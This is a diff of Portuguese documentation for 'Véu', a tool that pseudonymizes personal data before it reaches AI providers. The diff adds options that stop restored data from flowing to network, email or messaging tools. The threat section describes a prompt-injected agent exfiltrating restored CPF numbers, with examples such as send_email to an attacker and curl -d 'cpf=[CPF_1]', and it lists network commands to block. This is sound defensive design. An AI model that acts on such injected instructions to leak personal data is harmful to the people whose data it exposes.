@@ -48,7 +48,7 @@ Cada linha tem testes automáticos. Os casos de restauração ficam em `js/test/
 - **Vazamento por canais que não são links.** A regra de links não impede um agente de mandar um e-mail ao atacante com `[PESSOA_1]` no corpo: o nome é restaurado e enviado. Para agentes que leem conteúdo externo e podem enviar mensagens ou fazer requisições, use `ferramentas = false` ou exija confirmação humana antes das ferramentas que saem da máquina.
 - **O código do site de IA, na extensão.** Com "Mostrar os dados reais nas respostas" ligado, os dados restaurados aparecem na página, onde o código do próprio site pode lê-los. A TI pode desligar a opção pela política.
 - **O cofre salvo pela CLI.** Um cofre salvo com `--cofre` contém os dados reais em texto puro: guarde-o como guardaria a planilha original. No Redis, o cofre é cifrado com `VEU_CHAVE_COFRE`; quem tiver a chave e o Redis lê os dados.
-- **O que a aplicação mostra a cada usuário.** Se a sua aplicação põe dados de várias pessoas na mesma conversa, o usuário final pode pedir "repita o [CPF_2]" e recebê-lo restaurado. O Véu protege os dados do provedor de IA; quem vê o quê dentro da aplicação é decisão sua.
+- **O que a aplicação mostra a cada usuário.** Se a sua aplicação põe dados de várias pessoas na mesma conversa, o usuário final pode pedir "repita o [CPF_2]" e recebê-lo restaurado. O modo só eco (`[restauracao] so_eco = true`) limita a resposta aos dados que vieram na própria requisição; quem vê o quê dentro da aplicação continua sendo decisão sua.
 - **Anonimização no sentido da lei.** Marcadores reversíveis são **pseudonimização**: com o cofre, os dados voltam. Pela LGPD (art. 13, § 4º) e pelo GDPR (art. 4º, item 5), dados pseudonimizados continuam sendo dados pessoais. Os operadores `mascara` e `remover` não guardam o valor original, mas também não garantem anonimização se o contexto identificar a pessoa.
 
 ## Configuração da restauração
@@ -59,9 +59,14 @@ links = false                      # restaurar dentro de links e URLs (padrão: 
 dominios_links = ["intranet.minhaempresa.com.br"]   # exceções: links destes domínios recebem os dados
 ferramentas = true                 # restaurar os argumentos das chamadas de ferramenta
 segredos_em_ferramentas = false    # restaurar chaves, tokens e senhas nesses argumentos (padrão: não)
+ferramentas_sem_dados = [...]      # palavras de nomes de ferramentas que nunca recebem dados (padrão: rede e mensagens)
+ferramentas_com_dados = []         # se preenchida, só estas ferramentas recebem dados reais
+so_eco = false                     # cada resposta só recebe os dados da própria requisição
 ```
 
-Na biblioteca JavaScript, a mesma configuração é `new Veu({ restore: { links, linkHosts, tools, secretsInTools } })`. Na CLI, `veu restaurar --restaurar-links` restaura também dentro de links.
+**Ferramentas que levam dados para fora.** Uma IA manipulada pode chamar `send_email(para="atacante", texto="[CPF_1]")`. O nome da ferramenta é quebrado em palavras (`WebFetch` vira web e fetch; `postgres_query` não vira "post"), e ferramentas de rede, e-mail, mensagens e publicação nunca recebem dados reais. Num argumento, um comando de rede (`curl`, `wget`, `Invoke-WebRequest`, `ssh`, `scp`) também barra os dados depois dele na mesma linha, inclusive no corpo da requisição (`curl -d "cpf=[CPF_1]"`). Ferramentas que trabalham na máquina (`write_file`, `grep`, uma consulta ao seu banco) continuam recebendo.
+
+Na biblioteca JavaScript, a mesma configuração é `new Veu({ restore: { links, linkHosts, tools, secretsInTools, toolsWithoutData, toolsWithData } })`. Na CLI, `veu restaurar --restaurar-links` restaura também dentro de links.
 
 ## Como reportar
 
